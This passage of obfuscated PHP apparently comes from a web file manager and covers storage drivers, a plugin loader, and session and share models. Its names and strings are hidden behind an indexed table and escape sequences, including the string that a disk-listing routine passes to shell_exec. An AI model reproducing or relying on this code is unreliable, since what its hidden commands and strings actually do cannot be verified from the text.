md5($¡Ó˜‰ö . $à£ş™ Ì[1368] . Model($à£ş™ Ì[843])->get($à£ş™ Ì[844])); } public static function initSystemPath() { $§¿ÍøĞŸ =& $_SERVER[Ò°Ì”İ•]; if (defined($§¿ÍøĞŸ[1369])) { return; } define($§¿ÍøĞŸ[1369], self::systemPath($§¿ÍøĞŸ[202])); define($§¿ÍøĞŸ[1370], self::systemPath($§¿ÍøĞŸ[1371])); define($§¿ÍøĞŸ[1372], self::systemPath($§¿ÍøĞŸ[1373])); define($§¿ÍøĞŸ[1374], self::systemPath($§¿ÍøĞŸ[1375])); IOHistory::bindEvent(); } public static function systemPath($ó¾’ø‹Ë) { $ä‰Ñ“èˆ =& $_SERVER[Ò°Ì”İ•]; $Úğé’’” = $ä‰Ñ“èˆ[1376] . ucfirst($ó¾’ø‹Ë); $¾¦í³Íá = Model($ä‰Ñ“èˆ[843])->get($Úğé’’”); if ($¾¦í³Íá) { return $¾¦í³Íá; } if ($ó¾’ø‹Ë == $ä‰Ñ“èˆ[202]) { $¾¦í³Íá = self::make(Model($ä‰Ñ“èˆ[898])->systemRootPathAdd($ä‰Ñ“èˆ[620])); } else { $¾¦í³Íá = self::systemPath($ä‰Ñ“èˆ[202]); $’£ Ü = self::sourceID($¾¦í³Íá); $¾¦í³Íá = self::make(Model($ä‰Ñ“èˆ[898])->mkdir($’£ Ü, $ó¾’ø‹Ë)); } Model($ä‰Ñ“èˆ[843])->set($Úğé’’”, $¾¦í³Íá); return $¾¦í³Íá; } public static function systemFolder($¿ŒØ–î) { $Ï‚§¯ı = IO_PATH_SYSTEM_SOURCE . $¿ŒØ–î; $Õ•¤ƒø´ = Cache::get($Ï‚§¯ı); if (!$Õ•¤ƒø´) { $Äï·ƒ¬ = IO::infoFullSimple($Ï‚§¯ı); if (!$Äï·ƒ¬) { $Õ•¤ƒø´ = IO::mkdir($Ï‚§¯ı, REPEAT_SKIP); } else { $Õ•¤ƒø´ = $Äï·ƒ¬[$_SERVER[Ò°Ì”İ•][98]]; } Cache::set($Ï‚§¯ı, $Õ•¤ƒø´, 3600 * 10); } return $Õ•¤ƒø´; } public static function defaultDriver() { return Model($_SERVER[Ò°Ì”İ•][840])->defaultDriver(); } public static function defaultIO() { $ÀñşÚíŸ =& $_SERVER[Ò°Ì”İ•]; $±™êáêû = self::defaultDriver(); return $ÀñşÚíŸ[1377] . $±™êáêû[$ÀñşÚíŸ[487]] . $ÀñşÚíŸ[1365]; } public static function defaultDriverInit() { static $®¼‚üÊ = false; if ($®¼‚üÊ) { return $®¼‚üÊ; } $®¼‚üÊ = IO::init(self::defaultIO()); return $®¼‚üÊ; } public static function fileTypeList() { $­€œßòÁ =& $_SERVER[Ò°Ì”İ•]; $¡úÖ¤œ° = $GLOBALS[$­€œßòÁ[6]][$­€œßòÁ[1378]]; foreach ($¡úÖ¤œ° as $ãÔ…Ù¹‰ => $º“Îğüì) { $Â¥õ¤Ó = $­€œßòÁ[1379] . $ãÔ…Ù¹‰; $è±¹¾—× = LNG($Â¥õ¤Ó); if ($Â¥õ¤Ó != $è±¹¾—×) { $¡úÖ¤œ°[$ãÔ…Ù¹‰][$­€œßòÁ[32]] = $è±¹¾—×; } } return $¡úÖ¤œ°; } public static function diskList($ã¡´§×¿ = true) { $¼êª‡œÕ = $_SERVER[Ò°Ì”İ•][1380]; if ($ã¡´§×¿) { $Å¡‹¶±¸ = Cache::get($¼êª‡œÕ); if (is_array($Å¡‹¶±¸)) { return $Å¡‹¶±¸; } } $Å¡‹¶±¸ = self::diskListGet(); Cache::set($¼êª‡œÕ, $Å¡‹¶±¸, 60); return $Å¡‹¶±¸; } public static function diskListGet() { $€‚ˆ•âÕ =& $_SERVER[Ò°Ì”İ•]; $¤ÈéÔÛ² = array(); if ($GLOBALS[$€‚ˆ•âÕ[6]][$€‚ˆ•âÕ[1381]] == $€‚ˆ•âÕ[1382]) { $ëë½ƒ = $€‚ˆ•âÕ[1383]; for ($µˆœÉ‘» = 0; $µˆœÉ‘» < strlen($ëë½ƒ); $µˆœÉ‘»++) { $•ÌĞ’¬ = $ëë½ƒ[$µˆœÉ‘»] . $€‚ˆ•âÕ[1384]; if (file_exists($•ÌĞ’¬)) { $¤ÈéÔÛ²[] = $•ÌĞ’¬; } } return $¤ÈéÔÛ²; } if (!function_exists($€‚ˆ•âÕ[112])) { $¤ÈéÔÛ²[] = $€‚ˆ•âÕ[909]; return $¤ÈéÔÛ²; } $‰œ²Š»Î = explode($€‚ˆ•âÕ[59], shell_exec($€‚ˆ•âÕ[1385])); array_shift($‰œ²Š»Î); array_pop($‰œ²Š»Î); $ÒáãæëÂ = array($€‚ˆ•âÕ[1386], $€‚ˆ•âÕ[1387], $€‚ˆ•âÕ[1388], $€‚ˆ•âÕ[1389], $€‚ˆ•âÕ[1390], $€‚ˆ•âÕ[1391], $€‚ˆ•âÕ[1392], $€‚ˆ•âÕ[1393]); foreach ($‰œ²Š»Î as $¬åâåòİ) { $è‘†ìù’ = preg_split($€‚ˆ•âÕ[1394], $¬åâåòİ); $•ÌĞ’¬ = $è‘†ìù’[count($è‘†ìù’) - 1]; if (!strstr($è‘†ìù’[0], $€‚ˆ•âÕ[1395]) || !$•ÌĞ’¬) { continue; } $òéä–ºí = rtrim($•ÌĞ’¬, $€‚ˆ•âÕ[8]) . $€‚ˆ•âÕ[8]; if (in_array($òéä–ºí, $ÒáãæëÂ)) { continue; } $¤ÈéÔÛ²[] = $òéä–ºí; } return $¤ÈéÔÛ²; } public static function isSameDisk($¤Ş½­ê¸, $¥ŒáÈÔ) { $Ôö©Ê®± =& $_SERVER[Ò°Ì”İ•]; if ($GLOBALS[$Ôö©Ê®±[6]][$Ôö©Ê®±[1381]] == $Ôö©Ê®±[1382]) { return strtolower(substr($¤Ş½­ê¸, 0, 1)) == strtolower(substr($¥ŒáÈÔ, 0, 1)); } $ƒÃ¤ğœÎ = stat($¤Ş½­ê¸); $¾ğõ‚æç = stat($¥ŒáÈÔ); if ($ƒÃ¤ğœÎ === !1 || $¾ğõ‚æç === !1) { return !1; } return $ƒÃ¤ğœÎ[$Ôö©Ê®±[1396]] === $¾ğõ‚æç[$Ôö©Ê®±[1396]]; $ÖüÆ”Ô½ = self::diskList(); $œÔÛÉ©« = !1; $¼¡›˜ôÏ = !1; sort($ÖüÆ”Ô½); $ÖüÆ”Ô½ = array_reverse($ÖüÆ”Ô½); $¤Ş½­ê¸ = rtrim($¤Ş½­ê¸, $Ôö©Ê®±[8]) . $Ôö©Ê®±[8]; $¥ŒáÈÔ = rtrim($¥ŒáÈÔ, $Ôö©Ê®±[8]) . $Ôö©Ê®±[8]; foreach ($ÖüÆ”Ô½ as $“Õ«Úâ) { $–‡‰–„ = strlen($“Õ«Úâ); if (!$œÔÛÉ©« && substr($¤Ş½­ê¸, 0, $–‡‰–„) == $“Õ«Úâ) { $œÔÛÉ©« = $“Õ«Úâ; } if (!$¼¡›˜ôÏ && substr($¥ŒáÈÔ, 0, $–‡‰–„) == $“Õ«Úâ) { $¼¡›˜ôÏ = $“Õ«Úâ; } if ($œÔÛÉ©« && $¼¡›˜ôÏ) { break; } } return $œÔÛÉ©« === $¼¡›˜ôÏ; } public static function transferType($¸õ±šîÔ, $’†æÜã) { $Ï³øº¶ =& $_SERVER[Ò°Ì”İ•]; $‹ò’ßÚı = self::driverType($¸õ±šîÔ); $ø¥ŠºÑ® = self::driverType($’†æÜã); if ($‹ò’ßÚı[$Ï³øº¶[33]] == $ø¥ŠºÑ®[$Ï³øº¶[33]] && $‹ò’ßÚı[$Ï³øº¶[1397]] == $ø¥ŠºÑ®[$Ï³øº¶[1397]]) { return $Ï³øº¶[1398]; } if ($‹ò’ßÚı[$Ï³øº¶[33]] == $Ï³øº¶[943] && $ø¥ŠºÑ®[$Ï³øº¶[33]] == $Ï³øº¶[120]) { return $Ï³øº¶[1275]; } if ($‹ò’ßÚı[$Ï³øº¶[33]] == $Ï³øº¶[120] && $ø¥ŠºÑ®[$Ï³øº¶[33]] == $Ï³øº¶[943]) { return $Ï³øº¶[121]; } return $Ï³øº¶[1399]; } public static function driverType($Èçà³«¬) { $µÏÎ¡¯Æ =& $_SERVER[Ò°Ì”İ•]; $’²û¡ë· = str_replace($µÏÎ¡¯Æ[1400], $µÏÎ¡¯Æ[12], strtolower($Èçà³«¬->getType())); if ($’²û¡ë· == $µÏÎ¡¯Æ[830] || $’²û¡ë· == $µÏÎ¡¯Æ[1401] || $’²û¡ë· == $µÏÎ¡¯Æ[1402]) { $Èçà³«¬ = self::defaultDriverInit(); } else { if ($’²û¡ë· == $µÏÎ¡¯Æ[1285] || $’²û¡ë· == $µÏÎ¡¯Æ[1403]) { $Èçà³«¬ = IO::init($Èçà³«¬->pathParse[$µÏÎ¡¯Æ[1228]]); } } $ååè…Ê» = $Èçà³«¬->path; $’²û¡ë· = str_replace($µÏÎ¡¯Æ[1400], $µÏÎ¡¯Æ[12], strtolower($Èçà³«¬->getType())); if ($’²û¡ë· == $µÏÎ¡¯Æ[120]) { return array($µÏÎ¡¯Æ[33] => $µÏÎ¡¯Æ[120], $µÏÎ¡¯Æ[1397] => $µÏÎ¡¯Æ[12], $µÏÎ¡¯Æ[98] => $ååè…Ê», $µÏÎ¡¯Æ[109] => $Èçà³«¬); } return array($µÏÎ¡¯Æ[33] => $µÏÎ¡¯Æ[943], $µÏÎ¡¯Æ[1397] => $Èçà³«¬->pathDriver, $µÏÎ¡¯Æ[98] => $ååè…Ê», $µÏÎ¡¯Æ[109] => $Èçà³«¬); } public static function pathDriverType($“ÇœÁ¬) { return $“ÇœÁ¬ ? self::driverType(IO::init($“ÇœÁ¬)) : !1; } public static function pathDriverLocal($°ÈÜ»¹ş) { $æ¦š“´œ =& $_SERVER[Ò°Ì”İ•]; $ù‰« Èî = $°ÈÜ»¹ş ? self::driverType(IO::init($°ÈÜ»¹ş)) : !1; return strtolower($ù‰« Èî[$æ¦š“´œ[33]]) == $æ¦š“´œ[120] ? !0 : !1; } public static function allowCover($²²ğãú, $ÜÁåÍ°ğ = true) { $‡Î¨Ää =& $_SERVER[Ò°Ì”İ•]; if (is_string($²²ğãú)) { $²²ğãú = IO::info($²²ğãú); } if (!$²²ğãú || $²²ğãú[$‡Î¨Ää[33]] == $‡Î¨Ää[89] || $²²ğãú[$‡Î¨Ää[90]] <= 100) { return !1; } if (isset($²²ğãú[$‡Î¨Ää[1404]]) || !$²²ğãú[$‡Î¨Ää[98]]) { return !1; } if (isset($²²ğãú[$‡Î¨Ää[245]]) && !$²²ğãú[$‡Î¨Ää[245]]) { return !1; } static $ÒÉÒç‡¢ = false; if (!$ÒÉÒç‡¢ || !$ÜÁåÍ°ğ) { $«ƒ”ÃêÄ = self::driverType(IO::init($²²ğãú[$‡Î¨Ää[98]])); $÷«×Ï‘Ä = $«ƒ”ÃêÄ[$‡Î¨Ää[109]]; $ÒÉÒç‡¢ = $‡Î¨Ää[207]; if ($«ƒ”ÃêÄ[$‡Î¨Ää[33]] == $‡Î¨Ää[120]) { $ÒÉÒç‡¢ = $‡Î¨Ää[1405]; } if ($«ƒ”ÃêÄ[$‡Î¨Ää[109]] && is_array($«ƒ”ÃêÄ[$‡Î¨Ää[109]]->config)) { $Ëú‡ßÏƒ = $«ƒ”ÃêÄ[$‡Î¨Ää[109]]->config; if (isset($Ëú‡ßÏƒ[$‡Î¨Ää[1406]]) && $Ëú‡ßÏƒ[$‡Î¨Ää[1406]]) { $ÒÉÒç‡¢ = $‡Î¨Ää[1405]; } } $´îËÜû™ = KodIO::defaultDriver(); if (strtolower($´îËÜû™[$‡Î¨Ää[109]]) == $‡Î¨Ää[120] && is_array($´îËÜû™[$‡Î¨Ää[6]])) { $ºÇ¼›»ê = $´îËÜû™[$‡Î¨Ää[6]][$‡Î¨Ää[1258]]; if (substr($ºÇ¼›»ê, 0, 2) == $‡Î¨Ää[1407]) { $ºÇ¼›»ê = str_replace($‡Î¨Ää[1407], BASIC_PATH, $ºÇ¼›»ê); } $ºÇ¼›»ê = str_replace($‡Î¨Ää[267], $‡Î¨Ää[8], $ºÇ¼›»ê); if (substr($²²ğãú[$‡Î¨Ää[98]], 0, strlen($ºÇ¼›»ê)) == $ºÇ¼›»ê) { $ÒÉÒç‡¢ = $‡Î¨Ää[207]; } } } return $ÒÉÒç‡¢ == $‡Î¨Ää[1405] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($İÈå¥’Ğ) { parent::__construct($İÈå¥’Ğ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($À‰ëùĞÊ) { $ñÛÇ¨Åê =& $_SERVER[Ò°Ì”İ•]; if (substr($À‰ëùĞÊ, 0, 7) == $ñÛÇ¨Åê[229]) { $À‰ëùĞÊ = $ñÛÇ¨Åê[230] . substr($À‰ëùĞÊ, 7); } header($ñÛÇ¨Åê[186] . $À‰ëùĞÊ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($®½èŞ¤) { parent::__construct($®½èŞ¤); $this->setSignVersion($_SERVER[Ò°Ì”İ•][260]); } public function uploadFormData($›â“…óŞ, $¨æÒ‹ë = 3600) { $åÄş™ĞÍ =& $_SERVER[Ò°Ì”İ•]; $ß‚ïú–Ë = $åÄş™ĞÍ[242]; $ˆÂİ®ËÆ = $åÄş™ĞÍ[1408]; $š”Œ¤Æ  = $åÄş™ĞÍ[274]; $Á±™˜Ìú = gmdate($åÄş™ĞÍ[1409], time() + $¨æÒ‹ë); $†Éê³ğ = (string) time() . $åÄş™ĞÍ[85] . (string) (time() + $¨æÒ‹ë); $×Ó–‡Î = array($åÄş™ĞÍ[275] => $Á±™˜Ìú, $åÄş™ĞÍ[278] => array(array($åÄş™ĞÍ[318] => $ß‚ïú–Ë), array($åÄş™ĞÍ[279] => $this->bucket), array($åÄş™ĞÍ[280], $åÄş™ĞÍ[281], $åÄş™ĞÍ[12]), array($åÄş™ĞÍ[283] => $š”Œ¤Æ ), array($åÄş™ĞÍ[1410] => $ˆÂİ®ËÆ), array($åÄş™ĞÍ[1411] => $this->accessKey), array($åÄş™ĞÍ[1412] => $†Éê³ğ))); $×Ó–‡Î = json_encode($×Ó–‡Î); $ôù•å¢¿ = hash_hmac($åÄş™ĞÍ[1408], $†Éê³ğ, $this->secret); $ÇŒûœ¹ = sha1($×Ó–‡Î); $Ğ¾›àã¨ = hash_hmac($åÄş™ĞÍ[1408], $ÇŒûœ¹, $ôù•å¢¿); $í­ñÄù = array($åÄş™ĞÍ[318] => $ß‚ïú–Ë, $åÄş™ĞÍ[283] => $š”Œ¤Æ , $åÄş™ĞÍ[290] => base64_encode($×Ó–‡Î), $åÄş™ĞÍ[1410] => $ˆÂİ®ËÆ, $åÄş™ĞÍ[1411] => $this->accessKey, $åÄş™ĞÍ[1413] => $†Éê³ğ, $åÄş™ĞÍ[1414] => $Ğ¾›àã¨, $åÄş™ĞÍ[219] => $this->getHost()); return $í­ñÄù; } public function fileOutImage($û¥ŠÑµ, $™Û–˜ÙÎ = 250) { $†İë“ı =& $_SERVER[Ò°Ì”İ•]; if ($this->size($û¥ŠÑµ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($û¥ŠÑµ, $™Û–˜ÙÎ); } $ÙÎ¯¦‹† = $this->link($û¥ŠÑµ); $ÙÎ¯¦‹† .= $†İë“ı[1415] . $™Û–˜ÙÎ . $†İë“ı[1416]; $this->fileOutLink($ÙÎ¯¦‹†); } public function fileOutLink($šŠ•²Ú) { $˜şçÒä =& $_SERVER[Ò°Ì”İ•]; if (substr($šŠ•²Ú, 0, 7) == $˜şçÒä[229]) { $šŠ•²Ú = $˜şçÒä[230] . substr($šŠ•²Ú, 7); } header($˜şçÒä[186] . $šŠ•²Ú); die; } } goto e‡Œâ‹ğîß; b¶äšÙÌ’¨: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x70\154\x75\x67\151\156\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\141\x74\165\x73", "\x72\145\x67\x69\x65\163\164", "\143\157\x6e\146\x69\x67"); public function loadList($ÍûĞ³’ = false) { $»îùéõİ = array_to_keyvalue($this->listData(), $_SERVER[Ò°Ì”İ•][32]); if ($ÍûĞ³’) { return $»îùéõİ[$ÍûĞ³’]; } return $»îùéõİ; } public function init() { $í‡÷çÒĞ =& $_SERVER[Ò°Ì”İ•]; Hook::trigger($í‡÷çÒĞ[2093]); $êÚÌ‰‡ğ = $this->loadPluginList(); foreach ($êÚÌ‰‡ğ as $Æá ½Ê­ => $²Á½Õ¤“) { $Ø²ÁÇº¤ = $this->appAllow($Æá ½Ê­, $²Á½Õ¤“); if (!$Ø²ÁÇº¤) { continue; } foreach ($²Á½Õ¤“[$í‡÷çÒĞ[2094]] as $ÙÀ–ÎÃÚ => $‡ÖÚç») { Hook::bind($ÙÀ–ÎÃÚ, $‡ÖÚç»); } } Hook::trigger($í‡÷çÒĞ[2095]); Hook::trigger(ACTION); } public function appAllow($ÎŠö˜óÙ, $ßú Ÿ‹¸, $àŞ•´ø¤ = true) { $ÍÒ”Šš‰ =& $_SERVER[Ò°Ì”İ•]; $‡ßÔĞöğ = PLUGIN_DIR . $ÎŠö˜óÙ . $ÍÒ”Šš‰[2096]; if (!is_array($ßú Ÿ‹¸) || !is_array($ßú Ÿ‹¸[$ÍÒ”Šš‰[2094]]) || $ßú Ÿ‹¸[$ÍÒ”Šš‰[823]] != 1 || !is_file($‡ßÔĞöğ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ÍÒ”Šš‰[6]][$ÍÒ”Šš‰[2097]] || !$GLOBALS[$ÍÒ”Šš‰[6]][$ÍÒ”Šš‰[2098]]) { return !0; } $ú¿¼Ôæ¾ = explode($ÍÒ”Šš‰[50], strtolower($GLOBALS[$ÍÒ”Šš‰[6]][$ÍÒ”Šš‰[2098]])); return in_array(strtolower($ÎŠö˜óÙ), $ú¿¼Ôæ¾) ? !1 : !0; } if ($àŞ•´ø¤ && !Action($ÍÒ”Šš‰[2099])->checkAuth($ÎŠö˜óÙ)) { return !1; } return !0; } public function unInstall($ùñæÄ—Ş) { $¥ã¾ƒ =& $_SERVER[Ò°Ì”İ•]; $¸õÓ¿ñ = $this->loadList($ùñæÄ—Ş); if (file_exists(PLUGIN_DIR . $ùñæÄ—Ş)) { Hook::apply($ùñæÄ—Ş . $¥ã¾ƒ[2100]); } $this->remove($¸õÓ¿ñ[$¥ã¾ƒ[487]]); } public function changeStatus($«áäŠÀÀ, $À·õ) { $”½ˆÃ—Ë =& $_SERVER[Ò°Ì”İ•]; $¢¬â‡Ä = $this->loadList($«áäŠÀÀ); if ($À·õ) { Hook::apply($«áäŠÀÀ . $”½ˆÃ—Ë[2101]); } $this->update($¢¬â‡Ä[$”½ˆÃ—Ë[487]], array($”½ˆÃ—Ë[2102] => $À·õ)); } public function appRegist($ÔÃÄÂİá, $¥Úı×¾¡) { $êãü—Âƒ =& $_SERVER[Ò°Ì”İ•]; $ıòè´—² = $this->loadList($ÔÃÄÂİá); if ($ıòè´—²) { $this->update($ıòè´—²[$êãü—Âƒ[487]], array($êãü—Âƒ[2094] => $¥Úı×¾¡)); } else { $‹„Í¿˜ô = array($êãü—Âƒ[32] => $ÔÃÄÂİá, $êãü—Âƒ[2094] => $¥Úı×¾¡, $êãü—Âƒ[823] => 0, $êãü—Âƒ[6] => $this->getConfigDefault($ÔÃÄÂİá)); $this->insert($‹„Í¿˜ô); } } public function getConfigDefault($§ÏÖ«ç) { $ÆÀıÖ§ =& $_SERVER[Ò°Ì”İ•]; $’¢ŒöÔ = array(); $ÅÊ„‰¹ù = $this->getPackageJson($§ÏÖ«ç); if (!$ÅÊ„‰¹ù && is_array($ÅÊ„‰¹ù[$ÆÀıÖ§[2103]])) { return $’¢ŒöÔ; } foreach ($ÅÊ„‰¹ù[$ÆÀıÖ§[2103]] as $©Í„ã­° => $ÚÍÍ‚×¸) { if (!isset($ÚÍÍ‚×¸[$ÆÀıÖ§[462]]) || isset($’¢ŒöÔ[$©Í„ã­°])) { continue; } $’¢ŒöÔ[$©Í„ã­°] = $ÚÍÍ‚×¸[$ÆÀıÖ§[462]]; } return $’¢ŒöÔ; } public function getPackageJson($ÖøĞÎÂÒ) { return Hook::apply($ÖøĞÎÂÒ . $_SERVER[Ò°Ì”İ•][2104]); } public function getConfig($Ç‚ú—­, $´¾òÔ“ = false) { $‘ÅìØóª =& $_SERVER[Ò°Ì”İ•]; $´¥ÉÕõ = array(); $ùà´®ôö = $this->loadList($Ç‚ú—­); if ($ùà´®ôö && is_array($ùà´®ôö[$‘ÅìØóª[6]])) { $´¥ÉÕõ = $ùà´®ôö[$‘ÅìØóª[6]]; } if (!$´¥ÉÕõ || $´¾òÔ“) { $´¥ÉÕõ = $this->getConfigDefault($Ç‚ú—­); } return $´¥ÉÕõ; } public function setConfig($ößàÏ±, $É¥ø‰ÈĞ = false) { $›ü‰ßÙË =& $_SERVER[Ò°Ì”İ•]; $‘š“ıø = $this->loadList($ößàÏ±); if (!$‘š“ıø) { return !1; } $íÄòæÀË = $‘š“ıø[$›ü‰ßÙË[6]]; if ($É¥ø‰ÈĞ == !1) { $íÄòæÀË = array(); $É¥ø‰ÈĞ = $this->getConfigDefault($ößàÏ±); } foreach ($É¥ø‰ÈĞ as $ÇŞÀüØ² => $¨º¾£Àò) { $íÄòæÀË[$ÇŞÀüØ²] = is_string($¨º¾£Àò) ? trim($¨º¾£Àò) : $¨º¾£Àò; } $this->update($‘š“ıø[$›ü‰ßÙË[487]], array($›ü‰ßÙË[6] => $íÄòæÀË)); } public function viewList() { $àÅòæ» =& $_SERVER[Ò°Ì”İ•]; $Ó´àÂæ¼ = $this->loadList(); $this->pluginScan($Ó´àÂæ¼); $Ó´àÂæ¼ = $this->loadPluginList(); $ı²•Ò¢Ğ = array(); foreach ($Ó´àÂæ¼ as $ ¼Ìö†Ú => $úğ°½ŞÂ) { $ş™è¢¦Ö = $úğ°½ŞÂ; unset($úğ°½ŞÂ[$àÅòæ»[2094]], $úğ°½ŞÂ[$àÅòæ»[6]]); $ø¶ïä‡ê = PLUGIN_DIR . $úğ°½ŞÂ[$àÅòæ»[32]] . $àÅòæ»[2096]; if (!is_file($ø¶ïä‡ê)) { continue; } $–ô¼¨Ã± = Hook::apply($úğ°½ŞÂ[$àÅòæ»[32]] . $àÅòæ»[2104]); if (!is_array($–ô¼¨Ã±)) { continue; } $ı²•Ò¢Ğ[$ ¼Ìö†Ú] = array_merge($úğ°½ŞÂ, $–ô¼¨Ã±); if ($ş™è¢¦Ö[$àÅòæ»[6]][$àÅòæ»[1681]] != $–ô¼¨Ã±[$àÅòæ»[1655]]) { Hook::apply($úğ°½ŞÂ[$àÅòæ»[32]] . $àÅòæ»[2101]); $ş™è¢¦Ö[$àÅòæ»[6]][$àÅòæ»[1681]] = $–ô¼¨Ã±[$àÅòæ»[1655]]; $this->update($úğ°½ŞÂ[$àÅòæ»[487]], array($àÅòæ»[6] => $ş™è¢¦Ö[$àÅòæ»[6]])); } } return $ı²•Ò¢Ğ; } private function loadPluginList() { $Å¹Ñç =& $_SERVER[Ò°Ì”İ•]; $Äô¸•é¤ = $this->loadList(); if (strtolower(MOD) == $Å¹Ñç[2105]) { return $Äô¸•é¤; } $äÌß±“ï = Hook::trigger($Å¹Ñç[2106], $Äô¸•é¤); if ($Äô¸•é¤ && !$äÌß±“ï) { die; } return $äÌß±“ï ? $äÌß±“ï : $Äô¸•é¤; } private function pluginScan($‡°Õ´) { $à·Áä“É =& $_SERVER[Ò°Ì”İ•]; recursion_dir(PLUGIN_DIR, $”ö‹½‡Œ, $Ñô«Š×Ï, 0); foreach ($”ö‹½‡Œ as $Ô–¯éè¾) { $·ÂšÎ÷Ÿ = get_path_this($Ô–¯éè¾); if (isset($‡°Õ´[$·ÂšÎ÷Ÿ]) || !file_exists($Ô–¯éè¾ . $à·Áä“É[2107]) || !file_exists($Ô–¯éè¾ . $à·Áä“É[2096])) { continue; } Hook::apply($·ÂšÎ÷Ÿ . $à·Áä“É[2101]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\x5f\163\145\x73\163\x69\157\x6e"; public function get($°åÖ…û·) { $÷ŒßÕ­© =& $_SERVER[Ò°Ì”İ•]; $µ‹ı÷•¡ = $this->where(array($÷ŒßÕ­©[2108] => $°åÖ…û·))->find(); if (!is_array($µ‹ı÷•¡)) { return !1; } return $µ‹ı÷•¡[$÷ŒßÕ­©[182]]; } public function set($‰¼ßº†, $€ØÌğÆ, $ñ²‚¥¤ú = 3600) { $Ğ¯Ø“¹• =& $_SERVER[Ò°Ì”İ•]; $õÍ“¥­Ã = array($Ğ¯Ø“¹•[2108] => $‰¼ßº†, $Ğ¯Ø“¹•[2008] => $€ØÌğÆ, $Ğ¯Ø“¹•[2109] => $ñ²‚¥¤ú + time()); if (Session::get($Ğ¯Ø“¹•[2110])) { $õÍ“¥­Ã[$Ğ¯Ø“¹•[1768]] = Session::get($Ğ¯Ø“¹•[2110]); } else { $õÍ“¥­Ã[$Ğ¯Ø“¹•[1768]] = 0; } if ($this->get($‰¼ßº†)) { return $this->where(array($Ğ¯Ø“¹•[2108] => $‰¼ßº†))->save($õÍ“¥­Ã); } else { return $this->add($õÍ“¥­Ã, array(), !0); } } public function remove($…¬¶Œ´) { return $this->where(array($_SERVER[Ò°Ì”İ•][2108] => $…¬¶Œ´))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ò°Ì”İ•][2111] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\x69\x6d\x65", "\164\151\x6d\145", "\151\156\x73\x65\x72\164\x2c\x75\x70\144\141\164\145", "\146\x75\x6e\x63\164\x69\x6f\156"), array("\x63\x72\x65\x61\164\x65\124\x69\x6d\145", "\164\151\155\x65", "\151\x6e\x73\x65\x72\x74", "\146\x75\156\x63\164\x69\x6f\156"), array("\x6f\x70\x74\151\157\x6e\163", '', "\151\x6e\163\x65\162\164\54\x75\160\144\x61\x74\x65\54\163\145\x6c\x65\x63\164", "\152\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ÛºİäÈ‡) { $àÍùºªÒ =& $_SERVER[Ò°Ì”İ•]; $×şô¨ü† = isset($ÛºİäÈ‡[0]) ? $ÛºİäÈ‡[0] : !1; $¢”»ò˜® = $àÍùºªÒ[2112] . USER_ID; return array($àÍùºªÒ[2113] => array(USER_ID, $àÍùºªÒ[2114], $¢”»ò˜®), $àÍùºªÒ[2053] => array($×şô¨ü†, $àÍùºªÒ[2115], $¢”»ò˜®)); } protected function listSimple() { $í•ÏÀı˜ = array($_SERVER[Ò°Ì”İ•][1768] => USER_ID); $ãÆï§šî = $this->field($this->fieldList)->where($í•ÏÀı˜)->select(); return $ãÆï§šî ? $ãÆï§šî : array(); } protected function getInfo($àê”ÏöÂ, $Æ‚“¨Ìğ = false, $ëÓîá¯á = '') { $é÷Ò¬ã• =& $_SERVER[Ò°Ì”İ•]; if ($Æ‚“¨Ìğ) { return $this->_getShareInfo(array($é÷Ò¬ã•[680] => $àê”ÏöÂ)); } $¡Á±º£ı = $this->cacheFunctionGet($é÷Ò¬ã•[2055], $àê”ÏöÂ, $ëÓîá¯á); return $¡Á±º£ı; } public function getInfoByHash($¥½İ‘Ïø) { return $this->_getShareInfo(array($_SERVER[Ò°Ì”İ•][2116] => $¥½İ‘Ïø)); } public function getInfoByPath($©­°Ğóö) { $Îòßƒüë =& $_SERVER[Ò°Ì”İ•]; $¾æ¶Ï…Æ = array($Îòßƒüë[1768] => USER_ID, $Îòßƒüë[204] => $©­°Ğóö); return $this->_getShareInfo($¾æ¶Ï…Æ); } public function getInfoBySourcePath($éË€‰œô) { $€‰Áûìï =& $_SERVER[Ò°Ì”İ•]; $Ä…’Í = array($€‰Áûìï[1768] => USER_ID, $€‰Áûìï[1253] => $éË€‰œô); return $this->_getShareInfo($Ä…’Í); } private function _getShareInfo($”² şÂ) { $à›ïéÖ =& $_SERVER[Ò°Ì”İ•]; $¡ÒÌà¶ = $this->where($”² şÂ)->find(); if (!$¡ÒÌà¶) { return !1; } $”² şÂ = array($à›ïéÖ[680] => $¡ÒÌà¶[$à›ïéÖ[680]]); $¸÷÷‰†¡ = $à›ïéÖ[2117]; $¡€£Ø×È = Model($à›ïéÖ[681])->order($à›ïéÖ[487])->field($¸÷÷‰†¡)->where($”² şÂ)->select(); if ($¡ÒÌà¶[$à›ïéÖ[204]] == $à›ïéÖ[241]) { $¡ÒÌà¶[$à›ïéÖ[101]] = IO::info($¡ÒÌà¶[$à›ïéÖ[1253]]); } else { $¡ÒÌà¶[$à›ïéÖ[101]] = Model($à›ïéÖ[1417])->pathInfo($¡ÒÌà¶[$à›ïéÖ[204]]); } $¡ÒÌà¶[$à›ïéÖ[2118]] = $¡€£Ø×È; return $¡ÒÌà¶; } protected function getInfoAuth($ó¯‹ïäÆ) { $ÇŸî¤¦› =& $_SERVER[Ò°Ì”İ•]; $è§å´ÌÔ = $this->getInfo($ó¯‹ïäÆ); if ($è§å´ÌÔ[$ÇŸî¤¦›[1768]] == USER_ID) { $è§å´ÌÔ[$ÇŸî¤¦›[499]] = $è§å´ÌÔ[$ÇŸî¤¦›[101]][$ÇŸî¤¦›[499]]; } else { $è§å´ÌÔ[$ÇŸî¤¦›[499]] = Model($ÇŸî¤¦›[579])->authMake($è§å´ÌÔ[$ÇŸî¤¦›[2118]]); } return $è§å´ÌÔ; } protected function listData($‚ãØÒ¿æ = null, $”ì¶ã‰ö = 300) { 